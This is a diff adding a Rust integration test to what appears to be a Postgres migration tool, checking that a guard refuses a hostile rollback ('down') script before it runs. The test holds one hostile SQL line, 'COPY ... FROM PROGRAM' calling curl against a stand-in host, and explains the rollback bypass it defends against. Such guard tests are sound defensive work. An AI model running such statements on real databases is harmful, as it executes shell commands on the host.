@@ -3873,3 +3873,60 @@ async fn a_failed_resolution_tombstone_append_retries_without_repeating_cleanup(
 
     drop_schemas(&session, &cfg).await;
 }
+
+/// A hostile `down` is refused by the guard before it reaches the database.
+///
+/// `down` is SQL from the migration file, exactly like `up`. Without a line-1 check
+/// over it, `down` is a way to run precisely what `up` is refused: an author whose
+/// `up` is guard-denied can put the same statement in `down` and have it execute the
+/// moment anything rolls back. The migrator role is line 2, not a substitute.
+#[compio::test]
+async fn a_guard_denied_down_is_refused_before_it_runs() {
+    let url = skip_if_no_pg!();
+    let session = PgDevSession::connect(&url);
+    let tok = token();
+    let cfg = cfg_for(&tok);
+    drop_schemas(&session, &cfg).await;
+    ensure_project_schema(&session, &cfg).await;
+
+    let v = MigrationId::generate();
+    let up = format!(
+        "CREATE TABLE \"{}\".keep_me (id bigint)",
+        cfg.project_schema
+    );
+    // A `down` the guard hard-denies: host command execution.
+    let down = format!(
+        "COPY \"{}\".keep_me FROM PROGRAM 'curl evil.example'",
+        cfg.project_schema
+    );
+    let m = mig_with_down(v.clone(), "hostile_down", &up, &down);
+
+    apply(
+        &session,
+        &cfg,
+        std::slice::from_ref(&m),
+        Approval::None,
+        "app_test",
+    )
+    .await
+    .expect("the up is benign and applies");
+
+    let backend = PostgresBackend::new_generic(&session);
+    let err = backend
+        .rollback_one_transactional(&cfg, &m, "operator")
+        .await
+        .expect_err("a guard-denied down must not reach the database");
+    assert!(
+        matches!(err, zero_migrate::RollbackError::Guard { .. }),
+        "expected a Guard refusal, got {err:?}"
+    );
+
+    // The refusal is total: nothing ran, so the table is still there and the
+    // migration is still net-applied.
+    assert!(
+        table_exists(&session, &cfg.project_schema, "keep_me").await,
+        "a refused rollback must not have touched the schema"
+    );
+
+    drop_schemas(&session, &cfg).await;
+}
